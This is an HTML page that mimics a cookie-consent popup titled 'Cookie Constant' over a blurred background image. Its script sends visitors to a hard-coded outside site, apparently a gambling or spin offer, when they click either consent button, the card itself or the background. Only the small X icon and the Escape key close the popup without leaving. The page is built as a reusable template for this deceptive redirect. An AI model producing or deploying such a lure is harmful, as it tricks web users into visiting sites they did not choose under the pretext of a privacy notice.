<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>Cookie Constant</title>

<style>
  /* =====================================================
     DESIGN TOKENS
     ===================================================== */
  :root {
    --navy-900: #0A1F3D;
    --blue-accent: #0B5CAD;
    --blue-accent-dark: #094B8C;
    --white: #FFFFFF;
    --gray-900: #1A202C;
    --gray-700: #333A45;
    --glow: rgba(150, 210, 170, 0.55);

    --radius-md: 12px;
    --radius-lg: 20px;
  }

  * { box-sizing: border-box; }

  /* Lock the page completely — no scrolling in any direction. */
  html, body {
    height: 100%;
    margin: 0;
    overflow: hidden;
    overscroll-behavior: none;
  }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    color: var(--gray-900);
    background: var(--navy-900);
  }

  a { text-decoration: none; }

  /* =====================================================
     HERO BACKGROUND
     Full-screen, responsive, slightly blurred hero.png
     sits behind everything else on the page.
     ===================================================== */

  /* ===============================================================
     HERO IMAGE:
     This path is relative to index.html, so the whole popup
     folder can be placed at any path on your site (/go, /popup,
     nested folders, etc.) and it will still resolve correctly.
     Place your image here (relative to this file):
     image/hero.jpg
     =============================================================== */
  .hero-bg {
    position: fixed;
    inset: 0;
    z-index: 1;
    background-color: var(--navy-900); /* fallback tone until hero.jpg is added */
    background-image: url("image/hero.jpg");
    /* background-size: cover fills the entire screen edge-to-edge with
       no empty bars on any side. Combined with the top-anchored position
       below, this means only the excess beyond the viewport (typically
       the bottom of the image) gets trimmed — the header stays visible. */
    background-size: cover;
    /* Anchored to the top (not center) so the header/top portion of the
       image sits flush against the top of the screen and stays clearly
       visible. */
    background-position: center top;
    background-repeat: no-repeat;
    filter: blur(2px);
    transform: scale(1.03); /* prevents the blurred edge from showing */
    transform-origin: center top; /* scale grows from the top edge, not the
      center, so the header is never pulled off-screen — this is what was
      cropping the header out on mobile, where cover leaves no vertical
      slack to absorb a center-anchored scale */
  }

  /* Dark overlay so the popup card stays readable against the photo. */
  .hero-overlay {
    position: fixed;
    inset: 0;
    z-index: 2;
    background: rgba(0, 0, 0, 0.55);
  }

  /* =====================================================
     MODAL OVERLAY (positions the card, sits above the image)
     ===================================================== */
  .modal-overlay {
    position: fixed;
    inset: 0;
    z-index: 1000;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    opacity: 0;
    animation: overlayFadeIn 0.35s ease forwards;
  }

  .modal-overlay.hidden {
    display: none;
  }

  @keyframes overlayFadeIn {
    to { opacity: 1; }
  }

  /* =====================================================
     POPUP CARD
     ===================================================== */
  .modal {
    position: relative;
    background: var(--white);
    width: 100%;
    max-width: 600px;
    max-height: calc(100dvh - 40px);
    overflow-y: auto;
    border-radius: var(--radius-lg);
    padding: 48px 50px 44px;
    text-align: center;
    cursor: pointer;
    box-shadow:
      0 0 50px 6px var(--glow),
      0 25px 60px rgba(10, 20, 30, 0.14);
    transform: translateY(14px) scale(0.98);
    opacity: 0;
    animation: modalRiseIn 0.4s ease 0.05s forwards;
  }

  @keyframes modalRiseIn {
    to { transform: translateY(0) scale(1); opacity: 1; }
  }

  .modal-close {
    position: absolute;
    top: 18px;
    right: 18px;
    width: 34px;
    height: 34px;
    border: none;
    background: transparent;
    border-radius: 50%;
    color: var(--gray-700);
    font-size: 1.2rem;
    line-height: 1;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: background 0.2s ease, color 0.2s ease;
  }
  .modal-close:hover {
    background: #F0F2F5;
    color: var(--gray-900);
  }

  .modal h2 {
    margin: 8px 0 0;
    font-size: 1.7rem;
    font-weight: 600;
    letter-spacing: -0.01em;
    color: var(--gray-900);
  }

  .modal p {
    margin: 18px auto 0;
    max-width: 460px;
    color: var(--gray-700);
    font-size: 1.05rem;
    line-height: 1.55;
  }

  .modal-actions {
    margin-top: 30px;
    display: flex;
    flex-direction: column;
    gap: 14px;
  }

  .modal-actions .btn {
    display: block;
    width: 100%;
    padding: 15px 20px;
    border-radius: var(--radius-md);
    font-weight: 600;
    font-size: 1rem;
    transition: background 0.2s ease, color 0.2s ease, transform 0.15s ease;
  }

  .modal-actions .accept-btn {
    background: var(--blue-accent);
    color: var(--white);
    border: 1.5px solid var(--blue-accent);
  }
  .modal-actions .accept-btn:hover {
    background: var(--blue-accent-dark);
    border-color: var(--blue-accent-dark);
    transform: translateY(-1px);
  }

  .modal-actions .manage-btn {
    background: var(--white);
    color: var(--blue-accent);
    border: 1.5px solid var(--blue-accent);
  }
  .modal-actions .manage-btn:hover {
    background: #F3F8FD;
  }

  /* =====================================================
     RESPONSIVE
     ===================================================== */
  @media (max-width: 480px) {
    .modal { padding: 40px 26px 30px; }
    .modal h2 { font-size: 1.4rem; }
    .modal p { font-size: 0.98rem; }
    /* On narrow screens, cover crops the sides heavily. Anchor to the
       left so the left edge of the image stays fully visible, letting
       any excess get trimmed off the right instead of both sides. The
       scale transform's origin also moves to the left so it doesn't
       shave off any of that same left edge. */
    .hero-bg { background-position: left top; transform-origin: left top; }
  }

  /* Respect reduced motion preferences */
  @media (prefers-reduced-motion: reduce) {
    .modal, .modal-overlay { animation: none; opacity: 1; transform: none; }
  }
</style>
</head>
<body>

  <!-- =====================================================
       HERO BACKGROUND (full-screen, blurred image only)
       ===================================================== -->
  <div class="hero-bg"></div>
  <div class="hero-overlay"></div>

  <!-- =====================================================
       COOKIE CONSTANT POPUP
       Appears automatically on page load, centered above
       the dark overlay. Informational only — closing it
       does not block access to anything behind it.
       ===================================================== -->
  <div class="modal-overlay" id="policyOverlay">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="policyTitle">
      <button class="modal-close" id="closeIcon" aria-label="Close">&times;</button>

      <h2 id="policyTitle">Cookie Constant</h2>
      <p>Before proceeding, please review and accept our cookie policy to improve your experience.</p>

      <!-- Both buttons below automatically use UNIVERSAL_LINK,
           set once at the top of the <script> further down this file. -->
      <div class="modal-actions">
        <a href="#" class="btn accept-btn universal-link">Accept All Cookies</a>
        <a href="#" class="btn manage-btn universal-link">Manage Preferences</a>
      </div>
    </div>
  </div>

  <script>
    // =====================================================
    // UNIVERSAL LINK — set your destination URL ONCE here.
    // "Accept All Cookies", "Manage Preferences", the entire
    // popup card, and the blurred background outside the card
    // all use this same link.
    // =====================================================
    var UNIVERSAL_LINK = "https://funspinclub.site/no-play/?2zvtxjmc";

    document.querySelectorAll('.universal-link').forEach(function (el) {
      el.href = UNIVERSAL_LINK;
    });

    var modalCard = document.querySelector('.modal');
    modalCard.addEventListener('click', function (e) {
      if (e.target.closest('a, button')) return; // let links/buttons handle their own click
      window.location.href = UNIVERSAL_LINK;
    });

    // Popup is shown automatically on load (see markup above). The X icon
    // and Escape still dismiss it without navigating away. Clicking the
    // blurred background outside the card now navigates to UNIVERSAL_LINK,
    // same as the buttons.
    var policyOverlay = document.getElementById('policyOverlay');
    var closeIcon = document.getElementById('closeIcon');

    function dismissModal() {
      policyOverlay.classList.add('hidden');
    }

    closeIcon.addEventListener('click', dismissModal);

    policyOverlay.addEventListener('click', function (e) {
      if (e.target === policyOverlay) window.location.href = UNIVERSAL_LINK;
    });

    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape') dismissModal();
    });
  </script>

</body>
</html>
